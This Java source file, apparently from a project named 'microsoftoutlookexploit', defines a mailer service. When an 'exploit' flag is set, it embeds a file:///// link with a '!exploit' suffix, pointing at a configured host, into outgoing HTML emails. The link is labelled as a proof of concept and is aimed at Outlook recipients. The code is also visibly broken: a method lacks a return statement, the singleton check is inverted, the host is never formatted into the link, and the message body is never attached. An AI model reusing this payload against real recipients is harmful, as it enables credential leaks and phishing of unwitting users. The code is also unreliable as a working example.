package app.microsoftoutlookexploit;

import app.microsoftoutlookexploit.exception.FileException;
import app.microsoftoutlookexploit.models.MailContent;
import app.microsoftoutlookexploit.models.Type;
import com.sun.org.apache.xpath.internal.operations.Bool;
import jakarta.mail.*;
import jakarta.mail.internet.*;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.util.List;
import java.util.Objects;
import java.util.Properties;
import java.util.stream.Collectors;
import java.util.stream.Stream;

class InvalidMessageException extends Exception {
    private int code;

    public InvalidMessageException(String error, int code) {
        super(error);
        this.code = code;
    }

    public InvalidMessageException(int code) {
        this.code = code;
    }

}

public class MailerService {

    private final static int INVALID_FROM_EMAIL_CODE = 48;
    private final static int INVALID_SUBJECT_CODE = 49;
    private final static int CONFIG_RECIPIENTS = 50;
    private final static int CONFIG_FROM_ADDRESS = 51;
    private final static int CONFIG_SUBJECT = 52;
    private final static int SUCCESS = 0;
    private final static int FAILURE = 1;

    private final static String PROPERTIES_FILE = "config.properties";
    private static MailerService instance = null;
    private Session session;
    private String from;
    private String dns;

    private MailerService() throws FileNotFoundException, IOException {
        Properties properties = new Properties();
        properties.load(new FileInputStream(PROPERTIES_FILE));
        String username = Objects.requireNonNull(properties.getProperty("username"));
        String password = Objects.requireNonNull(properties.getProperty("password"));
        Authenticator auth = new Authenticator() {
            public PasswordAuthentication getPasswordAuthentication() {
                return new PasswordAuthentication(username, password);
            }
        };
        session = Session.getInstance(properties, auth);
    }

    public Message buildMessage(String subject, String toAddress) throws AddressException, MessagingException {
        Message msg = new MimeMessage(this.session);
        msg.setFrom(new InternetAddress(this.from));
        InternetAddress[] toAddresses = {new InternetAddress(toAddress)};
        msg.setRecipients(Message.RecipientType.TO, toAddresses);
        msg.setSubject(subject);
    }

    public Message buildMessage(String subject, List<String> toAddresseList) throws AddressException, InvalidMessageException {
        Message msg = new MimeMessage(this.session);
        try {
            msg.setFrom(new InternetAddress(this.from));
        } catch (MessagingException e) {
            throw new InvalidMessageException("Error when setting your recipient", CONFIG_FROM_ADDRESS);
        }
        Stream<InternetAddress> toAddresses = toAddresseList.stream().map((String addresse) -> {
            try {
                return new InternetAddress(addresse);
            } catch (AddressException e) {
                printInvalidEmailError(e.getMessage());
                return null;
            }
        }).filter(internetAddress -> Objects.nonNull(internetAddress));
        try {
            msg.setRecipients(Message.RecipientType.TO, (InternetAddress[]) toAddresses.toArray());
        } catch (MessagingException e) {
            throw new InvalidMessageException("Error when setting recipents addresses", CONFIG_RECIPIENTS);
        }
        try {
            msg.setSubject(subject);
        } catch (MessagingException e) {
            throw new InvalidMessageException("Error when setting subject", CONFIG_SUBJECT);
        }
        return msg;
    }

    public void printInvalidEmailError(String invalidError) {

    }

    public void sendEmail(MailContent mailContent, List<String> to, Boolean exploit) throws InvalidMessageException, MessagingException {

        Message message = null;
        message = buildMessage(mailContent.getSubject(), to);

        String type = null;
        if (mailContent.getType().equals(Type.HTML)) {
            type = "text/html; charset=utf-8";
        } else {
            type = "utf-8";
        }

        MimeBodyPart messageBody = new MimeBodyPart();
        String mailContentString = mailContent.getMessage();
        if(exploit)
            mailContentString = buildPayload(mailContent.getMessage(),this.dns);

        messageBody.setContent(mailContentString, type);

        Multipart multipart = new MimeMultipart("alternative");
        message.setContent(multipart);
        Transport.send(message);
    }


    public void sendEmail(MailContent mailContent, String to, Boolean exploit) throws InvalidMessageException, MessagingException {

        Message message = null;
        message = buildMessage(mailContent.getSubject(), to);

        String type = null;
        if (mailContent.getType().equals(Type.HTML)) {
            type = "text/html; charset=utf-8";
        } else {
            type = "utf-8";
        }

        MimeBodyPart messageBody = new MimeBodyPart();
        String mailContentString = mailContent.getMessage();
        if(exploit)
            mailContentString = buildPayload(mailContent.getMessage(),this.dns);

        messageBody.setContent(mailContentString, type);

        Multipart multipart = new MimeMultipart("alternative");
        message.setContent(multipart);
        Transport.send(message);
    }

    public static MailerService getInstance() throws FileException {
        if (instance != null) {
            try {
                instance = new MailerService();
            } catch (FileNotFoundException e) {
                throw new FileException("Config file is not found");
            } catch (IOException e1) {
                throw new FileException("Error from reading the config file, mainly this is coming from file permissions");
            }
        }
        return instance;
    }


    public String buildPayload(String message, String dns){
        String payload = "<p><a href=\"file://///{}/test!exploit\">POC_FOR_YOUTUBE</a></p>";
        payload = String.format(payload,dns);
        message = message.replace("{{payload}}", payload);
        return message;
    }
}
